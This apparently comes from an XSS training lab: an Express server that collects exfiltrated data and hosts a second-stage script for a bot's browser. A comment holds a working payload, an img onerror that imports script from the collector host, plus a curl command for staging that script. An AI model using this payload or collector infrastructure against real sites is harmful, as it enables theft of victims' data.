'use strict';

/*
 * Offline exfiltration collector -- the lab stand-in for Burp Collaborator,
 * webhook.site or your own VPS. Every request it receives is logged and shown
 * in the web view, so a payload running in the bot's browser can hand data back
 * to the student.
 */

const express = require('express');

const PORT = Number(process.env.PORT || 8080);
const MAX_ENTRIES = Number(process.env.MAX_ENTRIES || 200);

const entries = [];
const app = express();
app.disable('x-powered-by');
app.use(express.text({ type: '*/*', limit: '512kb' }));

app.use((req, res, next) => {
  res.set('access-control-allow-origin', '*');
  res.set('access-control-allow-headers', '*');
  res.set('access-control-allow-methods', '*');
  if (req.method === 'OPTIONS') {
    return res.status(204).end();
  }
  return next();
});

const record = req => {
  const entry = {
    at: new Date().toISOString(),
    method: req.method,
    path: req.originalUrl,
    query: req.query,
    body: typeof req.body === 'string' ? req.body.slice(0, 8000) : '',
    userAgent: req.get('user-agent') ?? '',
    from: req.ip,
    count: 1
  };
  // A hover payload fires on every pointer move, so collapse repeats of the
  // same request into one row with a counter.
  const previous = entries[0];
  if (previous && previous.method === entry.method && previous.path === entry.path && previous.body === entry.body) {
    previous.count += 1;
    previous.at = entry.at;
    return;
  }
  entries.unshift(entry);
  entries.length = Math.min(entries.length, MAX_ENTRIES);
};

/*
 * Second-stage hosting. With MAX_LABEL_LENGTH=50 the tooltip truncates long
 * names, so the payload has to be tiny. Stage your real script here first:
 *
 *   curl -X POST --data-binary @stage2.js http://localhost:8200/s.js
 *
 * then keep the injected name short enough to survive truncation:
 *
 *   <img src=x onerror=import('//c:8080/s')>
 */
let stagedScript = '// No second stage uploaded yet. POST one to /s.js\n';

app.get(['/s.js', '/s'], (_req, res) => res.type('application/javascript').send(stagedScript));

app.post(['/s.js', '/s'], (req, res) => {
  stagedScript = typeof req.body === 'string' ? req.body.slice(0, 20000) : '';
  res.json({ ok: true, bytes: stagedScript.length });
});

app.get('/api/log', (_req, res) => res.json(entries));

app.post('/api/clear', (_req, res) => {
  entries.length = 0;
  res.json({ ok: true });
});

const escapeHtml = value =>
  String(value).replace(/[&<>"']/g, ch => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' })[ch]);

const page = () => `<!doctype html>
<html lang="en"><head><meta charset="utf-8" />
<title>GridOps lab collector</title>
<meta http-equiv="refresh" content="5" />
<style>
  :root { color-scheme: dark; }
  body { font-family: ui-monospace, Menlo, Consolas, monospace; background: #0d1117; color: #d7e0ea; margin: 0; padding: 24px; }
  h1 { font-size: 18px; margin: 0 0 4px; }
  p.sub { color: #7d8ea1; margin: 0 0 20px; font-size: 13px; }
  table { border-collapse: collapse; width: 100%; font-size: 13px; }
  th, td { border-bottom: 1px solid #22303f; padding: 8px 10px; text-align: left; vertical-align: top; }
  th { color: #7d8ea1; font-weight: 400; }
  td.payload { color: #6ee7a8; word-break: break-all; white-space: pre-wrap; }
  .empty { color: #7d8ea1; padding: 32px 0; }
  .rep { color: #e8a33d; }
  form { margin-top: 20px; }
  button { background: #1f2a37; color: #d7e0ea; border: 1px solid #334155; padding: 6px 12px; cursor: pointer; }
</style></head>
<body>
<h1>Exfiltration collector</h1>
<p class="sub">Captured ${entries.length} request(s). Auto-refreshes every 5s. Send data here from the bot's browser:
<code>http://collector:8080/?c=...</code></p>
${
  entries.length
    ? `<table><thead><tr><th>time</th><th>method</th><th>path + query</th><th>body</th></tr></thead><tbody>${entries
        .map(
          entry => `<tr>
  <td>${escapeHtml(entry.at)}${entry.count > 1 ? ` <span class="rep">x${entry.count}</span>` : ''}</td>
  <td>${escapeHtml(entry.method)}</td>
  <td class="payload">${escapeHtml(decodeURIComponentSafe(entry.path))}</td>
  <td class="payload">${escapeHtml(entry.body)}</td>
</tr>`
        )
        .join('')}</tbody></table>`
    : '<div class="empty">Nothing captured yet.</div>'
}
<form method="post" action="/api/clear"><button type="submit">Clear log</button></form>
</body></html>`;

function decodeURIComponentSafe(value) {
  try {
    return decodeURIComponent(value);
  } catch {
    return value;
  }
}

app.get('/', (req, res) => {
  if (Object.keys(req.query).length) {
    record(req);
  }
  res.type('html').send(page());
});

app.use((req, res) => {
  if (req.path !== '/favicon.ico') {
    record(req);
  }
  res.type('text/plain').send('ok');
});

app.listen(PORT, '0.0.0.0', () => console.log(`[collector] listening on :${PORT}`));
